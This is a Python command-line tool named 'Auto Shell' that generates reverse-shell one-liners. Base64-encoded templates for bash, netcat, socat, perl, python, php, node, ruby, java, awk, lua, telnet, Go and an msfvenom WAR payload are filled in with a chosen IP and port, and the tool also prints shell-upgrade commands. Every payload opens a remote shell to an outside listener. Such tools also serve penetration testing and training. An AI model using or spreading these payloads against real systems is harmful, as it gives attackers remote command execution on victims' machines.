import argparse
import sys
import base64
import hashlib
import urllib.parse

#banner for program name
def banner():

	banner = (r'''


    ___         __           _____ __         ____
   /   | __  __/ /_____     / ___// /_  ___  / / /
  / /| |/ / / / __/ __ \    \__ \/ __ \/ _ \/ / / 
 / ___ / /_/ / /_/ /_/ /   ___/ / / / /  __/ / /  
/_/  |_\__,_/\__/\____/   /____/_/ /_/\___/_/_/  [by Josh Adkins] 
                                                  


''')

	print(banner)

#function containing all logic and code for shell generation
def shell():

	parser = argparse.ArgumentParser()

	parser.add_argument('-ip', '--ipaddress', type=str, help="IP Address", dest='ipaddr')
	parser.add_argument('-t', '--type', type=str, help="type of reverse shell", nargs='?', dest='type')
	parser.add_argument('-p', '--portnumber', type=int, help="port number to use in shell", dest='port')
	parser.add_argument('-l', '--list', action="store_true", help="list available shell and encryption options", dest='list')
	parser.add_argument('-e', '--encrypt', type=str, help="obfuscate the reverse shell", dest='encrypt')
	parser.add_argument('--upgrades', action="store_true", help="reverse shell upgrade commands", dest='upgrade')
	#add byte flag next in 2.0

	args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

	shells = {

	'bash' : ['YmFzaCAtaSA+JiAvZGV2L3RjcC97fS97fSAwPiYx', 'L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3Ave30ve30gMDwmMSAyPiYx',
			  'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97fS97fTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2'],

	'socat' : ['L3RtcC9zb2NhdCBleGVjOidiYXNoIC1saScscHR5LHN0ZGVycixzZXRzaWQsc2lnaW50LHNhbmUgdGNwOnt9Ont9'],

	'perl' : ['cGVybCAtZSAndXNlIFNvY2tldDskaT0ie30iOyRwPXt9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXt7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fX07Jw==',
	          'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7fTp7fSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc=',
	          'cGVybCAtTUlPIC1lICckYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwie306e30iKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjsn'],

	'golang' : ['ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwie306e30iKTtjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpO2NtZC5TdGRpbj1jO2NtZC5TdGRvdXQ9YztjbWQuU3RkZXJyPWM7Y21kLlJ1bigpfX0nID4gL3RtcC90LmdvICYmIGdvIHJ1biAvdG1wL3QuZ28gJiYgcm0gL3RtcC90Lmdv'],

	'python' : ['cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie30iLHt9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'],

	'php' : ['cGhwIC1yICckc29jaz1mc29ja29wZW4oInt9Iix7fSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn', 'PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLyJ7fSIve30gMD4mMSciKTs/Pg=='],

	'netcat' : ['bmMgLWUgL2Jpbi9zaCB7fSB7fQ==', 'L2Jpbi9zaCB8IG5jIHt9IHt9'],

	'node' : ['cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWkgPiYgL2Rldi90Y3Ave30ve30gMD4mMScpOw=='],

	'telnet' : ['cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQge30ge30gMC90bXAvcA=='],

	'ruby' : ['cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7fSIsIHt9KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc='],

	'java' : ['ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpCnAgPSByLmV4ZWMoWyIvYmluL2Jhc2giLCItYyIsImV4ZWMgNTw+L2Rldi90Y3Ave30ve307Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pCnAud2FpdEZvcigp'],

	'awk' : ['YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAve30ve30iOyB3aGlsZSg0Mikge3sgZG97eyBwcmludGYgInNoZWxsPiIgfCYgczsgcyB8JiBnZXRsaW5lIGM7IGlmKGMpe3sgd2hpbGUgKChjIHwmIGdldGxpbmUpID4gMCkgcHJpbnQgJDAgfCYgczsgY2xvc2UoYyk7IH19IH19IHdoaWxlKGMgIT0gImV4aXQiKSBjbG9zZShzKTsgfX19fScgL2Rldi9udWxs'],

	'lua' : ['bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgne30nLCd7fScpO29zLmV4ZWN1dGUoJy9iaW4vc2ggLWkgPCYzID4mMyAyPiYzJyk7Ig=='],

	'war' : ['bXNmdmVub20gLXAgamF2YS9qc3Bfc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9e30gTFBPUlQ9e30gLWYgd2FyID4gcmV2ZXJzZS53YXI=']
	}

	hash_dict = {

	'hashes' : ['url', 'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
	}
	
	shell_upgrades = {

	'upgrades' : ['cHl0aG9uIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn', 'c3R0eSByYXcgLWVjaG8=', 'ZXhwb3J0IFRFUk09eHRlcm0=', 'ZXhwb3J0IFNIRUxMPWJhc2g=', 'c3R0eSByb3dzIDU2IGNvbHVtbnMgMjEz']
	}


	if args.ipaddr == None:
		ip = '10.0.0.1'
	else:
		ip = args.ipaddr

	if args.port == None:
		port = 8080
	else:
		port = args.port

	if args.type == None and args.list == False:
		print('Enter a reverse shell from the list menu (--list)')

	

	if args.type:
			print('-- ' + args.type.capitalize() + ' Reverse Shell(s) --')
			for k, v in shells.items():
				for i in v:
					if k == args.type:
						if args.encrypt:
							for v in hash_dict.values():
								for g in v:
									if g == args.encrypt.lower():
										z = args.encrypt.lower()
										if z == 'md5':
											m = hashlib.md5()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nMD5 encrypted: ' + m.hexdigest())
										elif z == 'sha1':
											m = hashlib.sha1()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip, port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nSHA1 encrypted: ' + m.hexdigest())
										elif z == 'sha224':
											m = hashlib.sha224()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nSHA224 encrypted: ' + m.hexdigest())
										elif z == 'sha256':
											m = hashlib.sha256()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nSHA256 encrypted: ' + m.hexdigest())
										elif z == 'sha384':
											m = hashlib.sha384()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nSHA384 encrypted: ' + m.hexdigest())
										elif z == 'sha512':
											m = hashlib.sha512()
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m.update(str.encode(s))
											print('\n\n' + s + '\nSHA512 encrypted: ' + m.hexdigest())
										elif z == 'url':
											s = base64.b64decode(i).decode('utf-8')
											s = s.format(ip,port)
											m = urllib.parse.quote_plus(s)
											print('\n\n' + s + '\nURL encoded: ' + m)
						else:
							s = base64.b64decode(i).decode('utf-8')
							print('\n' + s.format(ip,port))
					

	if args.list:
		print("-- Available Reverse Shells --")
		for k in shells.keys():
			print(k.capitalize())
		print('\n' + "-- Available Encryption types --")
		for v in hash_dict.values():
			for g in v:
				print(str(g.capitalize()))

	if args.upgrade:
		print("\n--shell upgrades--")
		for v in shell_upgrades.values():
			for x in v:
				s = base64.b64decode(x).decode('utf-8')
				print(s)


def main():

	banner()
	shell()


if __name__ == '__main__':
	main()
